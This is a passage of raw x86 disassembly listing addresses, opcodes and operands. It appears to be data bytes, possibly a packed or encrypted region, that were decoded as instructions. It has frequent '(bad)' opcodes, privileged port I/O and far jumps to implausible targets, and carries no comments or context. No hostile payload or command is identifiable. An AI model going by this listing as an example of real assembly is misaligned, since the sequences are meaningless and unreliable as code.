  4176b2:	and    DWORD PTR [ebx-0x66],0xd
  4176b6:	xor    eax,0x5b523de8
  4176bb:	mov    ebx,0xbc15d20
  4176c0:	popf   
  4176c1:	nop    edi
  4176c4:	out    dx,eax
  4176c5:	jns    0x41765a
  4176c7:	jmp    0x41764a
  4176c9:	cli    
  4176ca:	adc    dh,bh
  4176cc:	outs   dx,BYTE PTR ds:[esi]
  4176cd:	add    eax,0x538a9810
  4176d2:	push   ss
  4176d3:	inc    esi
  4176d4:	inc    esp
  4176d5:	out    dx,al
  4176d6:	mov    edi,0x4d452ded
  4176db:	add    ebp,DWORD PTR [ebx-0x5def1dfe]
  4176e1:	scas   eax,DWORD PTR es:[edi]
  4176e2:	(bad)  
  4176e3:	jb     0x417712
  4176e5:	mov    edx,0xe1e2bdea
  4176ea:	lods   eax,DWORD PTR ds:[esi]
  4176eb:	lahf   
  4176ec:	sbb    al,0xaf
  4176ee:	seto   BYTE PTR [esp-0x2e127da8]
  4176f6:	push   cs
  4176f7:	bound  edx,QWORD PTR [edx+0x4f2077f8]
  4176fd:	test   al,0xd5
  4176ff:	push   edx
  417700:	jne    0x41771b
  417702:	mov    ds:0xd615493b,al
  417707:	in     eax,0x83
  417709:	call   0xd14cdc52
  41770e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41770f:	test   BYTE PTR [esi+0x6a43acb6],dl
  417715:	inc    ecx
  417716:	mov    ds:0x9d026658,eax
  41771b:	jnp    0x4176e2
  41771d:	sub    ebp,ecx
  41771f:	cmc    
  417720:	repnz xchg esi,eax
  417722:	cdq    
  417723:	cmp    al,0x89
  417725:	loope  0x4176be
  417727:	inc    BYTE PTR gs:[ebp-0x7e]
  41772b:	jmp    0x41779e
  41772d:	adc    eax,0x9dae163a
  417732:	dec    esp
  417733:	lds    esi,FWORD PTR [ebp+0x7f4eacd3]
  417739:	ret    0x6a43
  41773c:	pop    eax
  41773d:	and    cl,BYTE PTR [ecx-0x73e5d1c4]
  417743:	mov    ah,BYTE PTR [edi+0x2ad15e40]
  417749:	cmp    al,0xe9
  41774b:	lods   al,BYTE PTR ds:[esi]
  41774c:	or     BYTE PTR [edi+ecx*2],ch
  41774f:	arpl   di,di
  417751:	pop    edi
  417752:	imul   ecx,DWORD PTR [edx],0x55bfcaa2
  417758:	jge    0x4176dd
  41775a:	sub    esi,esp
  41775c:	add    ebp,esp
  41775e:	cmp    esp,DWORD PTR [esi-0x6c5aab2c]
  417764:	je     0x41775f
  417766:	mov    eax,0x9ca06a13
  41776b:	test   eax,0xa109b6ab
  417770:	cli    
  417771:	dec    edx
  417772:	fcom   st(7)
  417774:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417775:	and    DWORD PTR [ecx-0x7d],ebp
  417778:	in     eax,dx
  417779:	cmp    esp,DWORD PTR [ecx-0x47]
  41777c:	jae    0x4177ed
  41777e:	dec    ebp
  41777f:	sahf   
  417780:	or     al,0xa9
  417782:	sub    al,0xae
  417784:	mov    gs,WORD PTR [ebx]
  417786:	or     dh,BYTE PTR [eax-0x20]
  417789:	xchg   ebp,eax
  41778a:	pop    ebx
  41778b:	sub    DWORD PTR [ebx],esp
  41778d:	mov    ds:0x76ea3c11,eax
  417792:	mov    ?,WORD PTR [esi]
  417794:	adc    DWORD PTR [esi+0x4f],ebp
  417797:	shr    BYTE PTR [ebp-0x64],0x97
  41779b:	jae    0x41777e
  41779d:	repz out dx,eax
  41779f:	test   BYTE PTR ds:0x9f6a742d,0x75
  4177a6:	cmp    cl,BYTE PTR [esp+esi*1+0x5d611944]
  4177ad:	mov    ds:0xb483fc27,eax
  4177b2:	push   ebx
  4177b3:	loope  0x4177f9
  4177b5:	je     0x4177eb
  4177b7:	ss addr16 push cs
  4177ba:	or     BYTE PTR [ebp-0x5c141ca8],bh
  4177c0:	rcr    DWORD PTR [eax],0x91
  4177c3:	mov    DWORD PTR [ebx+eiz*2+0x2ea79f0f],edi
  4177ca:	fist   DWORD PTR [edi+eax*8]
  4177cd:	push   ebx
  4177ce:	std    
  4177cf:	(bad)  
  4177d0:	stos   BYTE PTR es:[edi],al
  4177d1:	int3   
  4177d2:	(bad)  
  4177d3:	stos   BYTE PTR es:[edi],al
  4177d4:	ja     0x417822
  4177d6:	cld    
  4177d7:	jmp    0x417841
  4177d9:	cmc    
  4177da:	mov    DWORD PTR ds:0x1f3e8beb,eax
  4177e0:	lock clc 
  4177e2:	rcr    BYTE PTR [ebp+0x383ff2cc],0x96
  4177e9:	sbb    al,0x37
  4177eb:	dec    edi
  4177ec:	loope  0x41777d
  4177ee:	mov    al,0xb2
  4177f0:	inc    esp
  4177f1:	imul   esi,DWORD PTR [ecx-0x184226a0],0x70
  4177f8:	mov    edi,0xe83c3b5
  4177fd:	add    eax,DWORD PTR [edx+0x208bed6a]
  417803:	ins    BYTE PTR es:[edi],dx
  417804:	outs   dx,DWORD PTR ds:[esi]
  417805:	lods   al,BYTE PTR ds:[esi]
  417806:	jmp    0x891a7419
  41780b:	retf   0x5f8e
  41780e:	adc    edx,edi
  417810:	jmp    DWORD PTR [ebp+0x3]
  417813:	mov    ch,0x65
  417815:	fstp   DWORD PTR [esi]
  417817:	in     eax,dx
  417818:	inc    eax
  417819:	dec    DWORD PTR [edx]
  41781b:	sub    eax,0xf8ffb85a
  417820:	loopne 0x4177ef
  417822:	cdq    
  417823:	test   DWORD PTR [esi-0x33],esp
  417826:	dec    edx
  417827:	leave  
  417828:	dec    esp
  417829:	mov    eax,ds:0x731f85d3
  41782e:	cld    
  41782f:	jnp    0x417806
  417831:	xor    al,dh
  417833:	push   edi
  417834:	lea    ebx,[ebx+ebp*1]
  417837:	fld    QWORD PTR [eax+0x6f800c55]
  41783d:	pop    eax
  41783e:	inc    ebx
  41783f:	test   esp,ebp
  417841:	pop    edi
  417842:	dec    esp
  417843:	mov    al,0x84
  417845:	ins    BYTE PTR es:[edi],dx
  417846:	test   al,0xd7
  417848:	and    BYTE PTR [edi-0xf9778e1],0xa0
  41784f:	adc    BYTE PTR ds:0xf4c4ba1a,0x9
  417856:	xchg   ebx,eax
  417857:	xchg   ecx,eax
  417858:	jle    0x4178a3
  41785a:	shl    ebp,1
  41785c:	inc    eax
  41785d:	mov    edi,0xc9e5eced
  417862:	fld    TBYTE PTR [eax]
  417864:	ins    DWORD PTR es:[edi],dx
  417865:	addr16 xor al,0x75
  417868:	pop    ds
  417869:	div    DWORD PTR [eax+esi*2+0x54eea843]
  417870:	and    bl,ah
  417872:	and    ch,BYTE PTR [edx+edx*8]
  417875:	fcom   QWORD PTR [ebx]
  417877:	es into 
  417879:	jno    0x417839
  41787b:	xor    eax,0x37f80ad1
  417880:	jecxz  0x417855
  417882:	mov    al,0xde
  417884:	popa   
  417885:	loopne 0x417820
  417887:	xchg   DWORD PTR [ecx+0x5f8c8681],esp
  41788d:	ins    BYTE PTR es:[edi],dx
  41788e:	call   0xd4d1:0xc487f221
  417895:	sbb    al,0x32
  417897:	xchg   edi,eax
  417898:	bound  esi,QWORD PTR [esi]
  41789a:	xchg   ecx,eax
  41789b:	cld    
  41789c:	ret    
  41789d:	lahf   
  41789e:	pop    ecx
  41789f:	aad    0x90
  4178a1:	mov    ecx,0x3b1c4432
  4178a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178a7:	clc    
  4178a8:	lock push esi
  4178aa:	dec    ecx
  4178ab:	mov    ?,WORD PTR [edi+eiz*1-0x70c09a75]
  4178b2:	shl    DWORD PTR [edx],1
  4178b4:	mov    edx,0x5318d1c3
  4178b9:	fisttp QWORD PTR [ecx-0x2efb5d0d]
  4178bf:	push   ebp
  4178c0:	and    ah,BYTE PTR ds:0xea69d55a
  4178c6:	inc    ecx
  4178c7:	iret   
  4178c8:	sbb    eax,0x96f9cedf
  4178cd:	cmp    dh,bl
  4178cf:	cli    
  4178d0:	fs adc al,0x9d
  4178d3:	out    0x5b,al
  4178d5:	jmp    0x49766277
  4178da:	jp     0x417951
  4178dc:	ss aas 
  4178de:	clc    
  4178df:	inc    ch
  4178e1:	push   ss
  4178e2:	repnz (bad) 
  4178e4:	jl     0x417950
  4178e6:	icebp  
  4178e7:	cmp    al,0x7e
  4178e9:	jns    0x417948
  4178eb:	arpl   WORD PTR [edx+0x6db2d710],cx
  4178f1:	aaa    
  4178f2:	adc    DWORD PTR [ecx+0x2fa5953a],ecx
  4178f8:	repnz xor ecx,ebp
  4178fb:	xor    ebx,DWORD PTR [eax]
  4178fd:	int3   
  4178fe:	or     eax,0x52830a6a
  417903:	neg    edx
  417905:	and    edi,esi
  417907:	(bad)  ds:0xa4b2b592
  41790d:	jp     0x4178c5
  41790f:	mul    esp
  417911:	aas    
  417912:	mov    DWORD PTR [edx+0x42a6bf3a],edx
  417918:	fdivr  QWORD PTR [edi+eiz*1-0x67ddaa47]
  41791f:	mov    bl,0xe3
  417921:	das    
  417922:	pop    ecx
  417923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417924:	out    0x19,eax
  417926:	jmp    0xf57c7dd
  41792b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41792c:	add    bh,BYTE PTR [edx]
  41792e:	xchg   esp,eax
  41792f:	ss popf 
  417931:	imul   eax,DWORD PTR [esi-0x71b2d228],0x12
  417938:	xor    eax,DWORD PTR [esi-0xe]
  41793b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41793c:	lock mov ah,0x11
  41793f:	push   ebp
  417940:	xchg   ecx,eax
  417941:	pop    ds
  417942:	mov    ecx,0x44d5fb76
  417947:	jmp    0x417989
  417949:	ss jbe 0x417946
  41794c:	jb     0x417935
  41794e:	loop   0x417983
  417950:	cmp    esi,DWORD PTR [esi]
  417952:	jo     0x417966
  417954:	daa    
  417955:	js     0x4178f8
  417957:	enter  0xa4ce,0xca
  41795b:	enter  0x1cc,0xb1
  41795f:	xor    bl,BYTE PTR [edx+0x63141ae1]
  417965:	xlat   BYTE PTR ds:[ebx]
  417966:	rcl    BYTE PTR [esi+0xfc38a7d],cl
  41796c:	dec    edi
  41796d:	or     BYTE PTR [esi-0x38],bh
  417970:	stos   BYTE PTR es:[edi],al
  417971:	lahf   
  417972:	jo     0x41792a
  417974:	mov    BYTE PTR [ebp-0x7f],dh
  417977:	(bad)  
  417979:	dec    ebp
  41797a:	fs cmc 
  41797c:	lahf   
  41797d:	pusha  
  41797e:	loop   0x4179cd
  417980:	sub    ch,cl
  417982:	mov    ds:0x347a6615,eax
  417987:	sbb    eax,0xafe5a2cb
  41798c:	sbb    dl,BYTE PTR [esi-0x4e]
  41798f:	rcr    DWORD PTR [esi+0x79eb35dc],1
  417995:	call   esi
  417997:	scas   al,BYTE PTR es:[edi]
  417998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417999:	push   es
  41799a:	mov    ds:0xb7478834,al
  41799f:	(bad)  
  4179a0:	cmp    DWORD PTR [ebx],esi
  4179a2:	dec    ebx
  4179a3:	stos   DWORD PTR es:[edi],eax
  4179a4:	push   esp
  4179a5:	enter  0x9b12,0x85
  4179a9:	sub    eax,0x6f7a6ec2
  4179ae:	cmp    BYTE PTR [ebx+eax*4+0x5],bl
  4179b2:	push   cs
  4179b3:	dec    esi
  4179b4:	ins    DWORD PTR es:[edi],dx
  4179b5:	js     0x4179b4
  4179b7:	shl    bh,0xdd
  4179ba:	fcomip st,st(1)
  4179bc:	push   es
  4179bd:	in     al,0xe1
  4179bf:	loopne 0x417984
  4179c1:	std    
  4179c2:	pusha  
  4179c3:	mov    ds:0x889f455b,eax
  4179c8:	je     0x41798c
  4179ca:	push   cs
  4179cb:	pop    ds
  4179cc:	cmp    bh,al
  4179ce:	ins    DWORD PTR es:[edi],dx
  4179cf:	xchg   DWORD PTR es:[edi+0x6d],esp
  4179d3:	sub    al,0xc
  4179d5:	xor    BYTE PTR [ebp+0x17fc3d2],bl
  4179db:	xchg   esi,eax
  4179dc:	sahf   
  4179dd:	out    dx,eax
  4179de:	mov    ?,WORD PTR [eax-0x7d]
  4179e1:	mov    ss,WORD PTR [edi-0x5dfdf38f]
  4179e7:	add    al,0xe
  4179e9:	pop    ebx
  4179ea:	dec    edx
  4179eb:	push   eax
  4179ec:	sub    ch,BYTE PTR [ebx]
  4179ee:	inc    edx
  4179ef:	mov    ds:0xe8ba773a,eax
  4179f4:	iret   
  4179f5:	xchg   ecx,eax
  4179f6:	outs   dx,BYTE PTR ds:[esi]
  4179f7:	dec    edx
  4179f8:	mov    ebp,0xbe12def6
  4179fd:	jb     0x4179e4
  4179ff:	sub    ecx,DWORD PTR [ecx+0x36cf3d0a]
  417a05:	cdq    
  417a06:	clc    
  417a07:	sub    ebx,ebp
  417a09:	fwait
  417a0a:	sub    esp,DWORD PTR [edi-0x6d9d15b5]
  417a10:	stos   DWORD PTR es:[edi],eax
  417a11:	and    eax,0x9071e977
  417a16:	sbb    eax,0x9ddc451d
  417a1b:	sti    
  417a1c:	outs   dx,BYTE PTR ds:[esi]
  417a1d:	jnp    0x417a90
  417a1f:	or     esi,DWORD PTR [edx]
  417a21:	loope  0x4179c9
  417a23:	das    
  417a24:	sub    BYTE PTR [esi],dl
  417a26:	sub    edi,esp
  417a28:	mov    cl,ch
  417a2a:	pop    es
  417a2b:	jno    0x4179ae
  417a2d:	sbb    esp,edi
  417a2f:	mov    edi,0x9eb3c4b3
  417a34:	cmp    DWORD PTR [esi],0x50160c9d
  417a3a:	lods   eax,DWORD PTR ds:[esi]
  417a3b:	daa    
  417a3c:	pushf  
  417a3d:	lods   eax,DWORD PTR ds:[esi]
  417a3e:	pop    eax
  417a3f:	icebp  
  417a40:	popf   
  417a41:	stos   DWORD PTR es:[edi],eax
  417a42:	sbb    ah,BYTE PTR [eax]
  417a44:	cs popa 
  417a46:	into   
  417a47:	jmp    0x3480dd11
  417a4c:	push   cs
  417a4d:	push   eax
  417a4e:	mov    ds:0x9daa4c1e,al
  417a53:	sub    ebx,ebx
  417a55:	mov    ecx,DWORD PTR [edx-0x5c0b0f18]
  417a5b:	lods   eax,DWORD PTR ds:[esi]
  417a5c:	mov    ebp,0xe8158be0
  417a61:	dec    ebp
  417a62:	shld   eax,edx,0x34
  417a66:	sub    edi,DWORD PTR [ebx+edx*2]
  417a69:	mov    eax,0x706be6e5
  417a6e:	mov    cl,BYTE PTR [edi+0x6e2e5ee7]
  417a74:	push   ds
  417a75:	and    DWORD PTR [ecx-0x7d75f056],esp
  417a7b:	test   BYTE PTR [edx-0x50f2f8a6],al
  417a81:	cmp    esp,ebp
  417a83:	popa   
  417a84:	push   cs
  417a85:	iret   
  417a86:	cs push edx
  417a88:	xor    DWORD PTR [edx-0x28],ebp
  417a8b:	inc    edi
  417a8c:	leave  
  417a8d:	mov    dh,0x61
  417a8f:	aam    0x88
  417a91:	xchg   esi,eax
  417a92:	adc    eax,DWORD PTR [esp+ecx*2+0x41644283]
  417a99:	pop    es
  417a9a:	mov    ecx,0xba9c38
  417a9f:	and    DWORD PTR [edx-0x5b],esp
  417aa2:	pop    ss
  417aa3:	mov    bl,0xa3
  417aa5:	(bad)  
  417aa7:	inc    ebp
  417aa8:	cwde   
  417aa9:	mov    edi,DWORD PTR [esp+0xe7c7ce1]
  417ab0:	sbb    DWORD PTR [edi+0x52],0xffffff84
  417ab4:	mov    DWORD PTR [eax-0x42],edx
  417ab7:	out    dx,eax
  417ab8:	repz xchg ecx,eax
  417aba:	add    BYTE PTR [edx+0x48],bh
  417abd:	xchg   BYTE PTR [esi+edi*1],cl
  417ac0:	(bad)  
  417ac1:	sub    WORD PTR [esi],0xffd0
  417ac5:	cs pop esp
  417ac7:	fs inc edi
  417ac9:	mov    ds:0xb0f59df1,al
  417ace:	fist   WORD PTR [edi+0x1a8472ed]
  417ad4:	test   al,0xd7
  417ad6:	pop    eax
  417ad7:	cmp    al,0x6c
  417ad9:	aad    0xdd
  417adb:	mov    bh,0x3b
  417add:	(bad)  
  417ade:	cli    
  417adf:	sbb    eax,0xffffffd7
  417ae2:	sub    BYTE PTR ds:0xde53af54,ah
  417ae8:	add    al,0x2
  417aea:	popf   
  417aeb:	or     eax,0x5c4551d0
  417af0:	mov    edx,0x41074ccb
  417af5:	jl     0x417b32
  417af7:	dec    ebp
  417af8:	sbb    cl,BYTE PTR ds:0xad460c57
  417afe:	or     DWORD PTR [ebx-0x7a45b4ba],esi
  417b04:	daa    
  417b05:	mov    ch,0x99
  417b07:	sbb    al,0x32
  417b09:	inc    ecx
  417b0a:	out    0x15,eax
  417b0c:	fisubr DWORD PTR [ebx]
  417b0e:	ins    DWORD PTR es:[edi],dx
  417b0f:	scas   eax,DWORD PTR es:[edi]
  417b10:	enter  0x381f,0x47
  417b14:	icebp  
  417b15:	mov    ebx,DWORD PTR [esi+ecx*1+0xa]
  417b19:	pop    ebx
  417b1a:	xchg   edx,eax
  417b1b:	cld    
  417b1c:	std    
  417b1d:	ss hlt 
  417b1f:	inc    edx
  417b20:	gs push ss
  417b22:	jns    0x417ac3
  417b24:	cli    
  417b25:	jge    0x417b5a
  417b27:	xor    ch,BYTE PTR [ebp+0x2b]
  417b2a:	xchg   ecx,eax
  417b2b:	clc    
  417b2c:	int    0xd3
  417b2e:	imul   esp,ecx,0x16d71819
  417b34:	jns    0x417b33
  417b36:	sbb    BYTE PTR [ecx+0x50949a01],0x70
  417b3d:	push   eax
  417b3e:	mov    al,ds:0xe5862c3c
  417b43:	(bad)  
  417b44:	cmp    edi,DWORD PTR [ebp-0x3]
  417b47:	dec    esp
  417b48:	cmp    al,0xcb
  417b4a:	jle    0x417ad0
  417b4c:	outs   dx,DWORD PTR ds:[esi]
  417b4d:	(bad)  
  417b4f:	jle    0x417b5f
  417b51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b52:	mov    ds:0xd171f32a,al
  417b57:	jmp    0xfc46:0x7fbd005f
  417b5e:	mov    ebp,0x1cf0eb83
  417b63:	and    eax,0x8e7731fd
  417b68:	jge    0x417ba3
  417b6a:	daa    
  417b6b:	(bad)  
  417b6c:	repnz jmp 0xc4e0:0xc2ef4274
  417b74:	aaa    
  417b75:	xor    bl,dh
  417b77:	out    dx,eax
  417b78:	inc    ecx
  417b79:	sbb    edi,DWORD PTR [ecx+0x471dce6b]
  417b7f:	enter  0x7416,0x95
  417b83:	test   DWORD PTR [ebp-0x6d],esp
  417b86:	rol    dl,cl
  417b88:	add    eax,0xf0dd5e44
  417b8d:	xchg   edx,eax
  417b8e:	mov    DWORD PTR [edx-0x2a],esp
  417b91:	sbb    dl,dh
  417b93:	cwde   
  417b94:	outs   dx,DWORD PTR ds:[esi]
  417b95:	mov    edx,0x2b9b0444
  417b9a:	test   al,0x5b
  417b9c:	cld    
  417b9d:	int3   
  417b9e:	mov    ch,0x9
  417ba0:	imul   esp,DWORD PTR [esi],0x22
  417ba3:	sub    BYTE PTR [ecx-0x3f],ah
  417ba6:	or     al,0x2c
  417ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ba9:	dec    ebx
  417baa:	repnz adc eax,DWORD PTR [ebx+0x4c126931]
  417bb1:	int    0x3e
  417bb3:	pusha  
  417bb4:	mov    esp,0x3092d0c
  417bb9:	mov    al,ch
  417bbb:	call   0x1b77:0xe38fa5d0
  417bc2:	and    al,0x6e
  417bc4:	test   DWORD PTR [esi-0x1b],edx
  417bc7:	add    DWORD PTR [edi-0x1d],esp
  417bca:	push   edi
  417bcb:	jbe    0x417bd5
  417bcd:	mov    ds:0x46fb5424,al
  417bd2:	or     al,0x66
  417bd4:	hlt    
  417bd5:	push   eax
  417bd6:	mov    eax,ds:0xdaa33af4
  417bdb:	cwde   
  417bdc:	out    0x60,al
  417bde:	fld    QWORD PTR [ebp-0x905a395]
  417be4:	lahf   
  417be5:	pop    esp
  417be6:	add    al,0x49
  417be8:	cs ss push es
  417beb:	dec    edx
  417bec:	push   ebx
  417bed:	out    dx,eax
  417bee:	jae    0x417c15
  417bf0:	daa    
  417bf1:	jbe    0x417c21
  417bf3:	push   0xffffffab
  417bf5:	in     al,dx
  417bf6:	arpl   cx,dx
  417bf8:	jmp    0xdcfc:0x674f011
  417bff:	ret    0x2a5
  417c02:	sub    ecx,ebx
  417c04:	push   ebp
  417c05:	add    ebp,esp
  417c07:	add    edx,DWORD PTR [edx+0x77]
  417c0a:	pop    ss
  417c0b:	sbb    al,0xc6
  417c0d:	mov    ebx,0x57898536
  417c12:	cmp    DWORD PTR [edi+0x1aecf54b],0xffffffa9
  417c19:	dec    esp
  417c1a:	pop    ds
  417c1b:	mov    BYTE PTR [ebx-0x6e312d01],bh
  417c21:	out    dx,al
  417c22:	mov    esi,0xb5a4ca21
  417c27:	pop    ds
  417c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c29:	push   0x6ffbf58c
  417c2e:	test   cl,ah
  417c30:	or     cl,dl
  417c32:	sar    esi,0x6
  417c35:	sub    BYTE PTR [ebx-0x7f],0xe7
  417c39:	add    al,0x9d
  417c3b:	outs   dx,DWORD PTR ds:[esi]
  417c3c:	push   esi
  417c3d:	dec    ebx
  417c3e:	or     edi,esp
  417c40:	cmc    
  417c41:	cmp    esi,DWORD PTR [edx-0x3f]
  417c44:	clc    
  417c45:	cmp    al,0x8a
  417c47:	test   al,0xc9
  417c49:	dec    ecx
  417c4a:	push   edi
  417c4b:	div    BYTE PTR [edi+0x15]
  417c4e:	or     al,BYTE PTR [ebx+0x23b5f588]
  417c54:	mov    cl,BYTE PTR [eax]
  417c56:	cmp    dh,ah
  417c58:	ret    0xd95c
  417c5b:	adc    DWORD PTR [esi+edi*1+0x283891d1],esi
  417c62:	or     eax,0x5cddd5a3
  417c67:	mov    es,edx
  417c69:	and    ecx,DWORD PTR ds:0x3c081cb2
  417c6f:	pop    eax
  417c70:	jmp    0x417c4d
  417c72:	adc    DWORD PTR [ecx+0x73],ebx
  417c75:	call   0x668363d1
  417c7a:	jmp    0x417cee
  417c7c:	cmp    al,BYTE PTR [edx+esi*2]
  417c7f:	jns    0x417c6c
  417c81:	cmp    al,0x96
  417c83:	out    0xc7,al
  417c85:	pop    esp
  417c86:	pop    ebp
  417c87:	int    0xbe
  417c89:	lods   eax,DWORD PTR ds:[esi]
  417c8a:	pop    es
  417c8b:	lods   al,BYTE PTR ds:[esi]
  417c8c:	add    BYTE PTR [edx],bl
  417c8e:	outs   dx,BYTE PTR ds:[esi]
  417c8f:	inc    ebx
  417c90:	mov    ds:0x7ee12dc7,eax
  417c95:	es scas al,BYTE PTR es:[edi]
  417c97:	rcr    DWORD PTR ds:0xe99e0584,1
  417c9d:	retf   0xddf2
  417ca0:	sub    eax,0x7b23d489
  417ca5:	push   es
  417ca6:	mov    esi,0x5c18cb78
  417cab:	in     eax,dx
  417cac:	fild   QWORD PTR [edi]
  417cae:	pop    ds
  417caf:	ds jae 0x417cc9
  417cb2:	out    dx,al
  417cb3:	ja     0x417cd0
  417cb5:	or     ecx,DWORD PTR [eax-0x32]
  417cb8:	scas   eax,DWORD PTR es:[edi]
  417cb9:	add    bh,dh
  417cbb:	dec    eax
  417cbc:	push   es
  417cbd:	mov    esi,0x4f7c381c
  417cc2:	rcr    BYTE PTR gs:[ecx+0x3de333cd],0x53
  417cca:	push   0xafbae180
  417ccf:	ins    BYTE PTR es:[edi],dx
  417cd0:	adc    BYTE PTR ds:0x32836eff,cl
  417cd6:	jno    0x417d04
  417cd8:	iret   
  417cd9:	dec    ebp
  417cda:	xor    BYTE PTR [ebp-0x5d27dad3],al
  417ce0:	sbb    eax,0xbf359992
  417ce5:	adc    BYTE PTR [ecx+0xc],0x65
  417ce9:	jecxz  0x417d57
  417ceb:	cld    
  417cec:	loopne 0x417c95
  417cee:	or     bl,bl
  417cf0:	mov    al,0xf7
  417cf2:	push   es
  417cf3:	mov    ds:0xd28fc6d3,al
  417cf8:	mov    cl,bl
  417cfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cfb:	inc    esp
  417cfc:	sub    ah,dh
  417cfe:	not    BYTE PTR [eax+0x1d]
  417d01:	xchg   edx,eax
  417d02:	xchg   esi,eax
  417d03:	stc    
  417d04:	pop    ebp
  417d05:	sbb    esi,esi
  417d07:	inc    ecx
  417d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d09:	and    edx,DWORD PTR [edi]
  417d0b:	sbb    ah,bl
  417d0d:	stos   DWORD PTR es:[edi],eax
  417d0e:	int    0x53
  417d10:	ja     0x417d22
  417d12:	shr    DWORD PTR [ecx+0x65],cl
  417d15:	xchg   edi,eax
  417d16:	(bad)  
  417d17:	sub    ch,al
  417d19:	mov    bl,0x86
  417d1b:	add    ch,ah
  417d1d:	adc    al,0x57
  417d1f:	and    edi,eax
  417d21:	xor    BYTE PTR [ecx-0x29],0x58
  417d25:	lea    edx,[ebx]
  417d27:	mov    ah,0x11
  417d29:	test   BYTE PTR [edi-0x6aef0882],cl
  417d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d30:	stos   DWORD PTR es:[edi],eax
  417d31:	shr    DWORD PTR [ebx+0x6aac5a6f],cl
  417d37:	aam    0xd
  417d39:	jmp    0x6e283cc0
  417d3e:	jns    0x417d6c
  417d40:	xor    DWORD PTR [ecx-0x74cb5c69],0xffffffb0
  417d47:	xor    dh,ch
  417d49:	adc    BYTE PTR [eax-0x2d05cc1c],al
  417d4f:	dec    edx
  417d50:	call   0x3ffee7df
  417d55:	mov    eax,0x9b1fb988
  417d5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d5b:	test   DWORD PTR [esi],0xe0302cb8
  417d61:	xlat   BYTE PTR ss:[ebx]
  417d63:	jno    0x417dcc
  417d65:	inc    esi
  417d66:	icebp  
  417d67:	mov    edx,0xc45d339b
  417d6c:	aas    
  417d6d:	stc    
  417d6e:	or     BYTE PTR [ebx],cl
  417d70:	(bad)  
  417d71:	fst    QWORD PTR [eax+0x75276d37]
  417d77:	vandpd ymm5,ymm0,ymm0
  417d7b:	in     al,dx
  417d7c:	cmp    BYTE PTR [edi+0x55],dh
  417d7f:	xchg   edx,eax
  417d80:	mov    al,ds:0xca221942
  417d85:	ficom  DWORD PTR [ecx-0x2a]
  417d88:	pop    eax
  417d89:	adc    eax,0x595fa1b3
  417d8e:	jecxz  0x417d62
  417d90:	add    al,0x6
  417d92:	inc    edi
  417d93:	imul   esi,ecx,0x6c514ea8
  417d99:	rcl    BYTE PTR [edi+ecx*4-0x5d],1
  417d9d:	push   ss
  417d9e:	scas   al,BYTE PTR es:[edi]
  417d9f:	aam    0x35
  417da1:	and    ch,BYTE PTR [ecx+ecx*1-0x3bf231e]
  417da8:	lds    ebp,FWORD PTR [ebx+0x51]
  417dab:	in     al,0x57
  417dad:	xlat   BYTE PTR ds:[ebx]
  417dae:	(bad)  
  417db0:	pusha  
  417db1:	(bad)  
  417db2:	iret   
  417db3:	out    dx,al
  417db4:	(bad)  
  417db6:	mov    ebp,0xcc36525c
  417dbb:	mov    WORD PTR [esi+0x21f7eacf],?
  417dc1:	dec    edi
  417dc2:	test   DWORD PTR [ecx],esp
  417dc4:	into   
  417dc5:	fild   QWORD PTR [edi+ebp*1]
  417dc8:	(bad)  
  417dc9:	dec    BYTE PTR [edx]
  417dcb:	jo     0x417ded
  417dcd:	loop   0x417d6b
  417dcf:	push   ebx
  417dd0:	push   ecx
  417dd1:	scas   al,BYTE PTR es:[edi]
  417dd2:	xchg   esi,edx
  417dd4:	mov    al,ds:0x8eb3f366
  417dd9:	mov    BYTE PTR [esi+0x25749fd3],al
  417ddf:	(bad)  
  417de0:	(bad)  
  417de1:	mov    esp,0x5f2926cf
  417de6:	sahf   
  417de7:	arpl   WORD PTR [ebp+0x8],dx
  417dea:	add    dl,dh
  417dec:	nop
  417ded:	push   edx
  417dee:	mov    eax,ds:0x1066243e
  417df3:	mov    dl,0xf8
  417df5:	mov    bh,0x65
  417df7:	inc    esi
  417df8:	add    eax,0x8d7ea8d
  417dfd:	push   edx
  417dfe:	mov    esi,0x75d1290f
  417e03:	inc    esi
  417e04:	in     al,dx
  417e05:	mov    dl,0xbc
  417e07:	es add eax,0xde44736e
  417e0d:	fs in  eax,dx
  417e0f:	and    al,0x77
  417e11:	add    eax,0xb62a981b
  417e16:	sub    dl,BYTE PTR [ebp+0x1d]
  417e19:	in     al,dx
  417e1a:	out    dx,al
  417e1b:	add    al,bh
  417e1d:	ds pop edi
  417e1f:	and    ch,BYTE PTR [ebx+esi*2-0x1eba8513]
  417e26:	fcmovnb st,st(6)
  417e28:	lods   eax,DWORD PTR ds:[esi]
  417e29:	fcomp  st(3)
  417e2b:	aaa    
  417e2c:	jo     0x417e82
  417e2e:	pop    ecx
  417e2f:	push   esi
  417e30:	jge    0x417e7a
  417e32:	cmp    DWORD PTR ds:[esp+eax*1-0x58ebe04a],ecx
  417e3a:	xor    BYTE PTR [esi-0x4616cbfc],0x9d
  417e41:	jbe    0x417e4c
  417e43:	jmp    0x8a197f67
  417e48:	cmp    edi,DWORD PTR ds:0xa3ff5016
  417e4e:	sar    DWORD PTR [edx-0x8f2ae50],0x7f
  417e55:	inc    esp
  417e56:	jl     0x417ec0
  417e58:	das    
  417e59:	push   esi
  417e5a:	mov    cl,0xb6
  417e5c:	pop    ss
  417e5d:	inc    ebp
  417e5e:	mov    eax,0xd018b7f0
  417e63:	addr16 pop ebp
  417e65:	ret    0xfc96
  417e68:	sbb    DWORD PTR [ecx+edi*1],edx
  417e6b:	fadd   QWORD PTR [esi-0x33c9d13c]
  417e71:	repnz cmp al,0xe9
  417e74:	(bad)
  417e77:	fsub   QWORD PTR [esi+ebp*8-0x4e]
  417e7b:	xchg   esp,eax
